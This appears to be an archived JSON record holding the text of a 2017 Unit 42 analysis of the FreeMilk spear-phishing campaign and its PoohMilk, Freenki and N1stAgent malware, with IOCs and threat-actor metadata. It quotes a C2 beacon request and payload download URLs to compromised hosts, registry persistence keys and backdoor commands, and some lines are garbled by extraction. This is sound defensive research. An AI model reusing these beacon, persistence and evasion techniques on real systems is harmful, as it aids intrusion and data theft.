{
    "id": "09ce4b89-5222-457d-a887-4595d636644b",
    "created_at": "2023-01-12T15:02:27.72722Z",
    "updated_at": "2025-03-27T02:05:30.902706Z",
    "deleted_at": null,
    "sha1_hash": "8960ec6dd400d4484ac5844d69a8d9c113b1e607",
    "title": "2017-10-05 - FreeMilk- A Highly Targeted Spear Phishing Campaign",
    "authors": "",
    "file_creation_date": "2022-05-27T22:59:15Z",
    "file_modification_date": "2022-05-27T22:59:15Z",
    "file_size": 721507,
    "plain_text": "# FreeMilk: A Highly Targeted Spear Phishing Campaign\n\n**[researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/](https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/)**\n\nJuan Cortes, Esmid Idrizovic October 5, 2017\n\nBy [Juan Cortes and](https://unit42.paloaltonetworks.com/author/juan-cortes/) [Esmid Idrizovic](https://unit42.paloaltonetworks.com/author/esmid-idrizovic/)\n\nOctober 5, 2017 at 5:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [FreeMilk,](https://unit42.paloaltonetworks.com/tag/freemilk/) [Freenki,](https://unit42.paloaltonetworks.com/tag/freenki/) [N1stAgent,](https://unit42.paloaltonetworks.com/tag/n1stagent/) [PoohMilk](https://unit42.paloaltonetworks.com/tag/poohmilk/)\n\nIn May 2017, Palo Alto Networks Unit 42 identified a limited spear phishing campaign targeting various individuals across the world. The threat\n[actor leveraged the CVE-2017-0199 Microsoft Word Office/WordPad Remote Code Execution Vulnerability with carefully crafted decoy content](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199)\ncustomized for each target recipient. Our research showed that the spear phishing emails came from multiple compromised email accounts\ntied to a legitimate domain in North East Asia. We believe that the threat actor hijacked an existing, legitimate in-progress conversation and\nposed as the legitimate senders to send malicious spear phishing emails to the recipients as shown below in Figure 1.\n\n\n-----\n\n_Figure 1 Conversation Hijacking to Deliver Malware_\n\nUpon successful exploitation, the malicious document delivered two malware payloads PoohMilk and Freenki.\n\nThe targeted victims in this campaign we identified include:\n\na bank based in the Middle East\ntrademark and intellectual property service companies based in Europe\nan international sporting organisation\nindividuals with indirect ties to a country in North East Asia\n\nIn past activity that we believe is linked to this same threat actor, dissidents and others were also likely targeted. We named this campaign\n“FreeMilk” after the words found in the malwares’ PDB path string.\n\n## Malicious Document\n\nThe threat actor leveraged Microsoft Word CVE-2017-0199 vulnerability which is popularly used in both targeted and non-targeted attacks at\npresent. The malicious document sends out the following beacon to a compromised website server as shown in Figure 2.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n\n\nGET /btob_asiana/udel_calcel.php?fdid=Skg/W1MkR2ZVOT5mVDg3JkpIO2RLRjNrSkgmIUpJO11TOGlhPV4/Z1NCLi4= HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR\n3.5.30729; .NET4.0C; .NET4.0E)\nHost: old.jrchina[.]com\nConnection: Keep-Alive\n\n\n_Figure 2. Malicious Word document callback beacon_\n\nThe C2 server responds with a Base64 encoded PowerShell script which in turn downloads two fake image files that contain embedded PE\nbinaries and a JavaScript file which extracts the embedded PE binaries onto the victim host as shown in Figure 3. The extracted PE payloads\nare what we label as PoohMilk and Freenki.\n\n\nOriginal File SHA256\n(Original File Name)\n\n1893af524edea4541c317df288adbf17ae4fcc3a30d403331eae541281c71a3c\n(udel_ok.ipp)\n\n64ef80e7639c8c5dddf239883617e6740c6b3589f995d11314d36ab64fcfc54c\n(appach01.jpg)\n\n40572e1fc37f4376fdb2a33a6c376631ff7bc00b1e64538a0385bc1e09a85574\n(appach02.jpg)\n\n_Figure 3. Downloaded files and extracted payloads_\n\n## PoohMilk Loader Analysis\n\n\nDownload URL Extracted Pay\n(Saved File N\n\nhttp://old.jrchina[.]com/btob_asiana/udel_ok.ipp \nhttp://old.jrchina[.]com/btob_asiana/appach01.jpg 7f35521cdbaa\n(Windows-KB\n\nhttp://old.jrchina[.]com/btob_asiana/appach02.jpg 35273d6c256\n(Windows-KB\n\n\nOur analysis shows that PoohMilk is the first stage loader. After a successful exploitation, it sets persistence in the registry with the appropriate\ncommand line argument to execute the second stage payload, in this case, Freenki. The following registry key-value pair in Figure 4 is used.\n\n_Figure 4. Registry key value set for the second stage payload by PoohMilk_\n\nIn addition to setting up the next stage, PoohMilk attempts to read and parse a file named \"wsatra.tmp\" in the user’s temp folder. If found, it\nreads its contents hoping to identify a path which is then searched in order to identify any file with an LNK extension, the same path is then\nsearched for files with a ZIP extension. The exact reason why it looks for *.lnk files is unclear. However, if it finds a *.zip file, it extracts its\ncontents and copies the data to a file under the user's temp folder. Using the following filename format:\n\n\"%s\\\\Rar0tmpExtra%d.rtf\"\n\nWhere the '%d' is taken from the return value of a call to the Windows API GetTickCount(). It then continues to execute this file with the\nWindows API ShellExecuteW().\n\nThe following PDB paths in Figure 5 were found from PoohMilk loader samples.\n\n\n1\n2\n\n\nE:\\BIG_POOH\\Project\\milk\\Release\\milk.pdb\nE:\\BIG_POOH\\Project\\Desktop\\milk\\Release\\milk.pdb\n\n\n_Figure 5. PDB paths found from PoohMilk samples_\n\n\n-----\n\nt as obse ed t at t e t eat acto co s ste t y de e s d e e t a a e pay oads toget e t oo oade e assu e t s s a\nattempt to lower the chance of payload malware getting exposed to the security research community as it can hide its malicious behaviour\nwhen being analysed by automated analysis systems without the proper command line argument.\n\n## Freenki Downloader Analysis\n\nFreenki has two main purposes. The first is to collect host information and the other is to serve as a second stage downloader. Each of these\nwill be explained in detail in the following section.\n\nFreenki depends on the right command line argument being passed to execute any of its interesting code, if no arguments are passed it simply\nexits. Freenki accepts three arguments which are described below:\n\n**console : It sets up persistence in the registry by using the current path of where the sample is being executed from and appending the**\nparameter ‘help’:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\nkey name: runsample\nkey value: “[CURRENT_EXECUTION_PATH] help”\n**help: This argument allows the malware to execute its main function which beacons to its C2. Further details in the next section.**\n**sample: This argument allows the malware to set up persistence and communicate with its C2. Synonymously as if we were to call the**\nmalware with the argument console followed by help.\n\nThe first thing Freenki does is collect the host’s MAC address. This is converted to a hex-string and is appended to each request to its C2. This\nvalue is likely to be used as an ID to identify the victim to the attacker. It is important to note that each request is postfix with an additional\nidentifier followed by the MAC address. The following IDs are used and all request are made with a HTTP POST method, and between each\nbeacon the malware sleeps for 25 seconds.\n\n0x30 = Initial communication made to the C2. The malware loops over sending this initial request until the C2 responds with a HTTP OK\n(200) status with additional data.\n0x31 = This identifier is used to send host information. Below are the details collected.\n\nUsername\nComputerName\nRetrieves the file version of kernel32.dll\nDetermines whether the process is running in x64, based on the Windows API function IsWow64Process() return value\nCollects all Ethernet MAC addresses\nAttempts to perform a WMI query to get: ComputerName, Model and Manufacturer\nCollects all running processes\n\nFigure 6 shows what the data looks like before encoding, more on this later\n\n_Figure 6. Host information collected by Freenki (before encoding)_\n\n0x34 = This identifier is used when the malware attempts to take a screenshot of the victim computer. The malware only collects a total of\nth h t b f i\n\n\n-----\n\n0 3 s de t e s used to et e e a seco da y C se e e data s ece ed e coded a d t e pa sed to get t e e C\naddress. More on this in the secondary payload delivery section.\n0x33 = The malware sends this identifier prior to parsing the decoded secondary C2.\n0x35 = This identifier is used after it executes the secondary payload. The malware sends back the secondary C2 used to download the\npayload.\n\nThe malware uses the same algorithm to decode and encode most of its data. The initial C2 and hard coded User-Agent string are encoded\n[and can be decoded using the code snippet in Figure 7. It is not a new method, but is worth noting that Freenki uses SSE instructions to](https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions)\ndecode its data.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nimport sys\n\ndef decode_data():\nwith open(sys.argv[1], 'rb') as infile:\nbuf = bytearray(infile.read())\noutput = bytearray([((x - 0xF) ^ 0x21) &amp; 0xFF for x in buf])\nwith open(\"decodedData.txt\", 'wb') as outfile:\noutfile.write(str(output))\n\nif __name__ == \"__main__\":\ndecode_data()\n\n\n_Figure 7. Python script to decode Freenki’s encoded data_\n\nWe mentioned that one of the identifiers the malware uses gives it the capability to retrieve a secondary C2 address. A somewhat important\nnote is the author uses the Windows API InternetOpenUrl(), therefore the secondary C2 address comes appended with either HTTP, HTTPS or\nFTP. Using the secondary C2 address the malware attempts to download another payload. This payload is expected to be greater than 100\nbytes and to begin with the ASCII values: ‘PNGF’. This secondary payload has two encoding layers. One is solely used in this part of the code\nand the second is the same encoding discussed previously which is used throughout the malware’s code. Once decoded, the malware writes\nthe secondary payload to the users %temp% folder with a pseudo-random name. Then using the Windows API ShellExecuteW() and a hardcoded argument ‘abai’, the malware executes the decoded payload (Figure 8).\n\nFigure 8. Secondary payload is executed with argument ‘abai’\n\n## Links to Previous Campaigns\n\n**Phishing campaign disguised as Hancom update**\n\nIn multiple occasions, we observed the PoohMilk loader discussed in this blog being used to load another remote administration tool we call\nN1stAgent (Figure 9, detailed analysis available in Appendix B).\n\nSHA256 Compile Date Original File Name Malware\nFamily\n\n\n1163da8c37ad9ba98d59b921ba8cf8e54bfc1282712cf754f4ff82b63f8e6027 2017-06-01\n05:10:53\n\nba5905c2fe46bd6734973139e759ba405fd193c2342dfcac396e9d529b57821b 2017-06-01\n05:17:06\n\n_Figure 9: N1stAgent and PoohMilk loader set_\n\n\nWindows-KB276133x86.exe\n\nWindows-KB251952x86.exe\n\n\nN1stAgent\nRAT\n\nPoohMilk\nLoader\n\n\n-----\n\nst ge t s ot de y used a d appea s to be so e y used ta geted attac s t s e o o ts st appea a ce ade t e p s g\n[campaign in January 2016. N1stAgent was delivered via phishing emails disguised as Hancom’s security patch.](https://en.wikipedia.org/wiki/Hancom)\n\n**Watering hole on anti-government media website**\n\n[In August 2016, visitors to an anti-government media website operated by defectors in United Kingdom were targeted by watering hole attack](http://www.boannews.com/media/view.asp?page=&gpage=&idx=51580)\nwith CVE-2016-0189 Microsoft Internet Explorer exploit. The exploit code attempted to deliver Freenki (Figure 10) as payload malware.\n\nSHA256 Download URL\n\n99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5 http://www.ethanpublishing[.]com/ethanpublishing/phpcms/templat\n\n_Figure 10. Freenki downloaded from the watering hole incident_\n\n## Conclusion\n\nThe FreeMilk spear phishing campaign is still ongoing, and is a campaign with a limited but wide range of targets in different regions. The\nthreat actor tried to stay under the radar by making malware that only executes when a proper argument is given, hijacked an existing email\nconversation and carefully crafted each decoy document based on the hijacked conversation to make it look more legitimate. We were not able\nto identify the second stage malware delivered via Freenki downloader during the campaign. We did notice some C2 infrastructure overlap with\n[other cases previously mentioned by TALOS and a](http://blog.talosintelligence.com/2017/04/introducing-rokrat.html) [private researcher. However, we are not conclusive about these connections as the C2](http://www.vxsecurity.sg/2016/11/22/technical-teardown-exploit-malware-in-hwp-files/)\ndomains were compromised websites and there were several months between the incidents.\n\n[AutoFocus customers can identify this, and other samples related to it using the BigPooh, Freenki, PoohMilk and N1stAgent tags](https://autofocus.paloaltonetworks.com/#/tag/Unit42.N1stAgent)\nWildFire and Traps properly classify the samples described in this report as malicious.\n\n### Appendix A: Indicators of Compromise\n\na50543919c52ccaea40155ce35aa791bc86bd634240fb51922827223aca5c88a\n\n201b876bcb97f6c8972cc677bdf1e3e2b2f069ae2ec4653db8af4797884efa30\n\n35273d6c25665a19ac14d469e1436223202be655ee19b5b247cb1afef626c9f2\n\nba5905c2fe46bd6734973139e759ba405fd193c2342dfcac396e9d529b57821b\n\n0f82ea2f92c7e906ee9ffbbd8212be6a8545b9bb0200eda09cce0ba9d7cb1313\n\n34478d6692f8c28332751b31fd695b799d4ab36a8c12f7b728e2cb99ae2efcd9\n\n7f35521cdbaa4e86143656ff9c52cef8d1e5e5f8245860c205364138f82c54df\n\n99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5\n\n1893af524edea4541c317df288adbf17ae4fcc3a30d403331eae541281c71a3c\n\n1163da8c37ad9ba98d59b921ba8cf8e54bfc1282712cf754f4ff82b63f8e6027\n\nef40f7ddff404d1193e025081780e32f88883fa4dd496f4189084d772a435cb2\n\nold.jrchina[.]com\n\nfoodforu.heliohost[.]org\n\nwww.ethanpublishing[.]com\n\ndiscgolfglow[.]com\n\n### Appendix B: N1stAgent Analysis\n\nSample properties:\n\nSHA256 1163da8c37ad9ba98d59b921ba8cf8e54bfc1282712cf754f4ff82b63f8e6027\n\nFile Name Windows-KB276133-x86.exe\n\nFile Size 302,080\n\nTimestamp 2017-06-01 05:10:53\n\nImport Hash 3d3f31627c09d1e68647b2a66491efb3\n\n\n-----\n\nPDB Path F:\\Backup\\2nd\\Agent\\Release\\Agent.pdb\n\nN1stAgent requires specific arguments to execute successfully. Some samples check only for one argument and others check for three\ndifferent arguments where each one is either executing the malware, sets a startup key and runs the malware or installs the malware as a\nservice. Service installation was not working in our found samples because the author seems to be forgotten to install the service with\narguments. Here is an example of a sample which supports three arguments:\n\nArgument Description\n\nhelp Run the malware\n\n333 Add a startup method and run the malware\nKey: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#\n\nName: Defender Update\n\nPath: <current filename> help\n\nusage Installs itself as a service\n\n      - Display name: Windows Normai TCP?IP ICMP Service\n\n      - Service Name: icmphosts\n\n       - Description: Provides support for the ICMP over TCP/IP service and ARP name resolution for clients on the network, therefore\nenabling users to Network, print, and log on to the network. If this service is stopped, these functions might be unavailable. If\nthis service is disabled, any services that explicitly depend on it will fail to start.\n\n_Figure B-1. N1stAgent supported arguments_\n\n### Connection to C2\n\nThe agent will try to read its configuration from a file in %APPDATA% with the file extension “.DAT”. The file is encoded with simple one byte\nXOR and will be decoded when read. If these files do not exist on the system it will skip them and continue to connect to a configured IP\naddress which is a web server. It will try to connect to the web server three times and each time it will send a GET request to download a file\nfrom the server which contains an additional IP address. The configuration which defines the web server information is encrypted with XOR\nand contains these three values:\n\nServer IP address\nHostname\nFile name for the GET request\n\n_Figure B-2. N1stAgent C2 connection_\n\nIf the connection does not work or if the server is down it will try to connect to another predefined IP address which is also stored encrypted in\nthe binary. It will connect to the server, send its network adapter address and wait for commands from the server.\n\nIf the server responds back with the command ID 19899003 then it will contain a new IP address where the agent should connect to and then\nthe agent will finally reveal its backdoor functionality.\n\nThe backdoor functionality supports basically 3 functions. First feature is remote shell (command “sm”) which emulates cmd.exe on the remote\n[host This feature is interesting because the code is copy pasted from Wine command program source code](https://github.com/alexhenrie/wine/blob/master/programs/cmd/wcmdmain.c)\n\n\n-----\n\n_Figure B-3. “Wine Cmd” in N1stAgent_\n\nThe second feature is the file manager (command “fm”) which supports the basic file features like list-, move-, delete-, set date time-, uploadand download files.\n\nThe third feature (command “gm”) is a function which lets the remote attacker change the configuration. For example, he can create the\nconfiguration files in %APPDATA% directory which contain additional IP addresses where the malware should connect to in future.\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-10-05 - FreeMilk- A Highly Targeted Spear Phishing Campaign.pdf"
    ],
    "report_names": [
        "2017-10-05 - FreeMilk- A Highly Targeted Spear Phishing Campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535747,
    "ts_updated_at": 1743041130,
    "ts_creation_date": 1653692355,
    "ts_modification_date": 1653692355,
    "files": {
        "pdf": "https://archive.orkl.eu/8960ec6dd400d4484ac5844d69a8d9c113b1e607.pdf",
        "text": "https://archive.orkl.eu/8960ec6dd400d4484ac5844d69a8d9c113b1e607.txt",
        "img": "https://archive.orkl.eu/8960ec6dd400d4484ac5844d69a8d9c113b1e607.jpg"
    }
}